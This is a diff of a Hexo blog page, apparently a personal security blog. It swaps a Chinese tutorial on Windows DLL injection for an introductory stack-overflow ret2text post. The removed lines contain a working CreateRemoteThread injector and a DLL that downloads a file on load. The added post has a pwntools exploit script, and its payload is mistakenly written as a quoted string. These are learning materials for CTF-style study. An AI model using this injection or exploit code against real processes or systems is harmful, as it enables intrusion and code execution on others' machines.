@@ -16,21 +16,26 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="DLL 注入DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能 DLL的实现方法  创建远程线程(CreateRemoteThread) 使用注册表(AppInit_Dlls) 消息勾取(SetWindowsHookEx() API)  CreateRemoteThread()主程序 123">
+    <meta name="description" content="栈溢出基本原理“溢出”顾名思义指超出界限。栈溢出是指程序向栈中写入的字节数超过了变量本身所申请的字节数，因而导致其相邻的栈中的值被改变，而相邻的栈中可能会保存一些重要的信息，比如可以通过构造修改返回地址，从而实现控制程序执行流。  如图所示，字符串申请的空间为14字节，如果使用gets()这种不加限制的危险函数，就有可能覆盖上面的返回地址。 exampleret2text 即控制可执行程序本身已经">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dll注入">
-<meta property="og:url" content="https://lafdrew.github.io/2024/06/24/dll%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:title" content="Pwn初识(一)">
+<meta property="og:url" content="https://lafdrew.github.io/2024/07/11/Pwn%E5%88%9D%E8%AF%86-%E4%B8%80/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="DLL 注入DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能 DLL的实现方法  创建远程线程(CreateRemoteThread) 使用注册表(AppInit_Dlls) 消息勾取(SetWindowsHookEx() API)  CreateRemoteThread()主程序 123">
+<meta property="og:description" content="栈溢出基本原理“溢出”顾名思义指超出界限。栈溢出是指程序向栈中写入的字节数超过了变量本身所申请的字节数，因而导致其相邻的栈中的值被改变，而相邻的栈中可能会保存一些重要的信息，比如可以通过构造修改返回地址，从而实现控制程序执行流。  如图所示，字符串申请的空间为14字节，如果使用gets()这种不加限制的危险函数，就有可能覆盖上面的返回地址。 exampleret2text 即控制可执行程序本身已经">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-06-23T16:29:13.000Z">
-<meta property="article:modified_time" content="2024-06-24T16:50:26.937Z">
+<meta property="og:image" content="https://lafdrew.github.io/res/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE-17206352885291.jpg">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20240711143219840.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20240711144010023.png">
+<meta property="article:published_time" content="2024-07-10T18:00:21.000Z">
+<meta property="article:modified_time" content="2024-07-11T06:53:13.751Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lafdrew.github.io/res/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE-17206352885291.jpg">
   
   
   
-  <title>dll注入 - Hexo</title>
+  <title>Pwn初识(一) - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -188,7 +193,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="dll注入"></span>
+            <span id="subtitle" data-typed-text="Pwn初识(一)"></span>
           
         </div>
 
@@ -199,8 +204,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-24 00:29" pubdate>
-          June 24, 2024 am
+        <time datetime="2024-07-11 02:00" pubdate>
+          July 11, 2024 am
         </time>
       </span>
     
@@ -211,7 +216,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          447 words
+          1.1k words
         
       </span>
     
@@ -222,7 +227,7 @@
         
         
         
-          4 mins
+          10 mins
         
       </span>
     
@@ -259,28 +264,57 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">dll注入</h1>
+            <h1 id="seo-header">Pwn初识(一)</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h1><p>DLL 注入是命令其他进程自行调用LoadLibrary() API加载用户指定的DLL，加载DLL的过程中会自动调用DllMain()函数，从而实现各种功能</p>
-<p>DLL的实现方法</p>
+                <h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>“溢出”顾名思义指超出界限。栈溢出是指程序向栈中写入的字节数超过了变量本身所申请的字节数，因而导致其相邻的栈中的值被改变，而相邻的栈中可能会保存一些重要的信息，比如可以通过构造修改返回地址，从而实现控制程序执行流。</p>
+<p><img src="/../res/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE-17206352885291.jpg" srcset="/img/loading.gif" lazyload alt="未命名绘图-17206352885291"></p>
+<p>如图所示，字符串申请的空间为14字节，如果使用gets()这种不加限制的危险函数，就有可能覆盖上面的返回地址。</p>
+<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>ret2text 即控制可执行程序本身已经有的代码(即，.text中的代码)</p>
+<h3 id="首先检查一下程序的保护机制"><a href="#首先检查一下程序的保护机制" class="headerlink" title="首先检查一下程序的保护机制"></a>首先检查一下程序的保护机制</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">checksec file<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">Arch:     i386-32-little<br>   RELRO:    Partial RELRO<br>   Stack:    No canary found<br>   NX:       NX enabled<br>   PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure>
+
 <ul>
-<li>创建远程线程(CreateRemoteThread)</li>
-<li>使用注册表(AppInit_Dlls)</li>
-<li>消息勾取(SetWindowsHookEx() API)</li>
+<li><p>RELRO</p>
+<p>RELRO保护原理<br>简介<br>由于 GOT和PLT以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过PLT表进行的，解析完成后，相应的GOT条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。</p>
+<p>RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，它最初于2004年由Redhat的工程师Jakub jelnek实现，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免GOT上的地址被篡改。RELRO有两种形式：</p>
+<p>partial PELRO：一些段（包括.dynamic,.got等）在初始化后会被标记为只读。在unbuntu16.04（GCC-5.4.0）上，默认开启Partial RELRO。<br>**Full RELRO **：除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读，但其实.got.plt会被直接合并到.got，也就看不到这段了。另外link_map和_dl_runtime_reolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改GOT。</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62675330/article/details/124049914">https://blog.csdn.net/weixin_62675330/article/details/124049914</a></p>
+</li>
+<li><p>Stack Canaries(先简单了解一下)</p>
+<p>栈溢出保护原理——Stack Canaries<br>Stack Canaries （取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄露，有预警的作用）</p>
+<p>是一种对抗栈溢出攻击的技术，即SSP安全机制</p>
+<p>Canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62675330/article/details/123146971">https://blog.csdn.net/weixin_62675330/article/details/123146971</a></p>
+</li>
+<li><p>NX</p>
+<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+</li>
+<li><p>PIE</p>
+<p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址</p>
+</li>
+<li><p>IDA静态分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>​		同时发现程序中存在调用system(“&#x2F;bin&#x2F;sh”),所以可以直接控制程序的返回地址到system(“&#x2F;bin&#x2F;sh”)，拿到shell</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0804863</span>A                 mov     dword ptr [esp], <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br></code></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h2><p>主程序</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// InjectDll.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">InjectDll</span><span class="hljs-params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>, hThread = <span class="hljs-literal">NULL</span>;<br>    HMODULE hMod = <span class="hljs-literal">NULL</span>;<br>    LPVOID pRemoteBuf = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//确定路径需要占用的缓冲区大小</span><br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="hljs-number">1</span>) * <span class="hljs-built_in">sizeof</span>(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    <br>    <span class="hljs-keyword">if</span> (!(hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <br>    pRemoteBuf = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    <br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br><br>    <br>    hMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)<span class="hljs-built_in">GetProcAddress</span>(hMod, <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>   <br>    hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>   <br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, TCHAR* argv[])<br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        _tprintf(<span class="hljs-string">&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// inject dll</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="hljs-number">1</span>]), argv[<span class="hljs-number">2</span>]))<br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">else</span><br>        _tprintf(<span class="hljs-string">&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><ul>
+<li><p>确定s的存储地址和返回地址的相对位置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">Breakpoint 1, 0x080486ae in main () at ret2text.c:24<br>warning: 24	ret2text.c: No such file or directory<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────<br> EAX  0xffffd2ac ◂— 0<br> EBX  0xf7fa4e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* &#x27;,\r#&#x27; */<br> ECX  0xf7fa68a0 (_IO_stdfile_1_lock) ◂— 0<br> EDX  0<br> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0<br> ESI  0x80486d0 (__libc_csu_init) ◂— push ebp<br> EBP  0xffffd318 ◂— 0<br> ESP  0xffffd290 —▸ 0xffffd2ac ◂— 0<br> EIP  0x80486ae (main+102) —▸ 0xfffdade8 ◂— 0xfffdade8<br><br></code></pre></td></tr></table></figure>
 
-<p>DLL download index.html </p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// myhack.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;tchar.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;urlmon.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_URL             (<span class="hljs-string">&quot;http://www.naver.com/index.html&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_FILE_NAME   (<span class="hljs-string">&quot;index.html&quot;</span>)</span><br><br>HMODULE g_hMod = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProc</span><span class="hljs-params">(LPVOID lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    TCHAR szPath[_MAX_PATH] = &#123; <span class="hljs-number">0</span>, &#125;;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">GetModuleFileName</span>(g_hMod, szPath, MAX_PATH))<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    TCHAR* p = _tcsrchr(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!p)<br>        <span class="hljs-keyword">return</span> FALSE;<br><br>    _tcscpy_s(p + <span class="hljs-number">1</span>, _MAX_PATH, DEF_FILE_NAME); <span class="hljs-comment">//参数准备</span><br><br>    <span class="hljs-built_in">URLDownloadToFile</span>(<span class="hljs-literal">NULL</span>, DEF_URL, szPath, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//调用函数进行URL下载</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function">BOOL WINAPI <span class="hljs-title">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><br>    g_hMod = (HMODULE)hinstDLL;<br><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>            <span class="hljs-built_in">OutputDebugString</span>(<span class="hljs-string">&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);<br><br>           hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProc, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br><br>         <span class="hljs-built_in">CloseHandle</span>(hThread);<br>         <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>​		</p>
+<p>​	<img src="/../res/image-20240711143219840.png" srcset="/img/loading.gif" lazyload alt="image-20240711143219840"></p>
+</li>
+</ul>
+<p>​								</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&quot;b&#x27;A&#x27; * (0x6c + 4) + p32(target)&quot;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
+<h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><p>可以看到已经拿到shell<img src="/../res/image-20240711144010023.png" srcset="/img/loading.gif" lazyload alt="image-20240711144010023">												</p>
 
-<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>windows 操作系统默认提供了AppInit_Dlls和LoadAppInit_Dlls两个注册表，当User32.dll被加载到到进程中，会读取Appinit表中的dll中，加载到进程中。所以可以利用这个特性加载任意的Dll。</p>
-<p>User32.dll是windows图形界面的主要支持。是非常常见的Dll。</p>
-<h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx()"></a>SetWindowsHookEx()</h2>
                 
               </div>
             
@@ -298,7 +332,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/RE/" class="category-chain-item">RE</a>
+  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
   
   
 
@@ -310,6 +344,13 @@
     </div>
   
   
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+    </div>
+  
 </div>
 
 
@@ -318,8 +359,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>dll注入</div>
-      <div>https://lafdrew.github.io/2024/06/24/dll注入/</div>
+      <div>Pwn初识(一)</div>
+      <div>https://lafdrew.github.io/2024/07/11/Pwn初识-一/</div>
     </div>
     <div class="license-meta">
       
@@ -331,7 +372,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>June 24, 2024</div>
+          <div>July 11, 2024</div>
         </div>
       
       
@@ -363,18 +404,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/07/11/Pwn%E5%88%9D%E8%AF%86-%E4%B8%80/" title="Pwn初识(一)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Pwn初识(一)</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/06/19/mini-L/" title="mini-L">
-                        <span class="hidden-mobile">mini-L</span>
+                      <a href="/2024/06/24/dll%E6%B3%A8%E5%85%A5/" title="dll注入">
+                        <span class="hidden-mobile">dll注入</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
